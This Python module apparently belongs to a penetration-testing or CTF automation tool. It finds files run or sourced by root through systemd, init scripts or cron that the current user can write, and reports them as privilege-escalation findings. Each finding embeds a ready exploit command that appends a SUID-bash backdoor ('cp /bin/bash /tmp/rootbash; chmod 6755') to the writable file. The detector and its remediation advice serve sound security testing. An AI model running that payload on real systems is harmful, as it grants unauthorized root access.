"""Generalized "root reads a file I can write" privesc detector.

This is the *class* behind a whole family of custom-service boxes (the NiFi/dahdi
lesson, generalized): root executes or sources some file, and the current user can
write it. Instead of coding one module per app, we cross two sets that the enum
already collects:

* **writable files** — from `find / -writable`;
* **root-referenced files** — systemd `ExecStart=` binaries, init-script `source`/`.`
  targets, and cron command paths.

Any file in the intersection is a root-code-execution primitive: write your payload
into it and wait for (or trigger) the root action. Pure function over the enum text,
so it works on ANY box that fits the pattern — no writeup, no per-app code.
"""

from __future__ import annotations

import re

from ..core.state import Finding, Severity

# Directories whose "writable" files are noise, not privesc primitives.
_NOISE = re.compile(r"^/(proc|sys|dev|run|tmp|var/tmp|var/log|var/cache)(/|$)")
# A systemd ExecStart line -> the executable path (skip +/-/@/! prefixes and env).
_EXEC_RE = re.compile(r"ExecStart[^=]*=\s*[-+@!]*\s*(/\S+)", re.IGNORECASE)
# An init/profile source line: `. /path` or `source /path`.
_SOURCE_RE = re.compile(r"(?:^|\s)(?:\.|source)\s+(/\S+)")
# Absolute paths that look like a command target inside a cron line.
_CRONPATH_RE = re.compile(r"(/[A-Za-z0-9._/-]+\.(?:sh|py|pl|rb|conf|cfg|env|service))\b")
_ABS_PATH = re.compile(r"^/[A-Za-z0-9._/ -]+$")


def _blocks(text: str) -> dict[str, str]:
    """Split the enum blob (``$ cmd\\n output`` chunks) into {command: output}."""
    blocks: dict[str, str] = {}
    cur_cmd: str | None = None
    buf: list[str] = []
    for line in (text or "").splitlines():
        if line.startswith("$ "):
            if cur_cmd is not None:
                blocks[cur_cmd] = "\n".join(buf)
            cur_cmd = line[2:]
            buf = []
        else:
            buf.append(line)
    if cur_cmd is not None:
        blocks[cur_cmd] = "\n".join(buf)
    return blocks


def _writable_set(blocks: dict[str, str]) -> set[str]:
    out: set[str] = set()
    for cmd, body in blocks.items():
        if "-writable" not in cmd:
            continue
        for line in body.splitlines():
            p = line.strip()
            if _ABS_PATH.match(p) and not _NOISE.match(p):
                out.add(p)
    return out


def _root_referenced(blocks: dict[str, str]) -> dict[str, str]:
    """Map a root-referenced file path -> the mechanism (systemd/init/cron)."""
    refs: dict[str, str] = {}
    for cmd, body in blocks.items():
        low = cmd.lower()
        if "execstart" in low or ".service" in low:
            for m in _EXEC_RE.finditer(body):
                refs.setdefault(m.group(1), "systemd ExecStart")
        if "init.d" in low:
            for m in _SOURCE_RE.finditer(body):
                refs.setdefault(m.group(1), "init-script source")
        if "cron" in low:
            for m in _SOURCE_RE.finditer(body):
                refs.setdefault(m.group(1), "cron source")
            for m in _CRONPATH_RE.finditer(body):
                refs.setdefault(m.group(1), "cron command")
    return refs


def find_writable_root_exec(enum_text: str) -> list[Finding]:
    """Findings where a root-referenced file is also writable by us (privesc)."""
    blocks = _blocks(enum_text)
    writable = _writable_set(blocks)
    refs = _root_referenced(blocks)
    out: list[Finding] = []
    for path, mechanism in sorted(refs.items()):
        if path not in writable:
            continue
        out.append(Finding(
            title=f"Writable file executed/sourced by root: {path}",
            severity=Severity.HIGH,
            description=f"root runs or sources '{path}' via {mechanism}, and the "
                        "current user can write it. Overwrite it with a payload "
                        "(e.g. copy bash to a SUID location or read /root/root.txt) "
                        "and trigger or wait for the root action - a root-code-"
                        "execution primitive independent of any specific app.",
            evidence=f"{path}  <-  {mechanism}  (writable)",
            exploit=(f"echo 'cp /bin/bash /tmp/rootbash; chmod 6755 /tmp/rootbash' "
                     f">> {path}   # then trigger the {mechanism}; /tmp/rootbash -p"),
            remediation="Restrict write permissions on files referenced by "
                        "privileged units/cron/init scripts.",
        ))
    return out
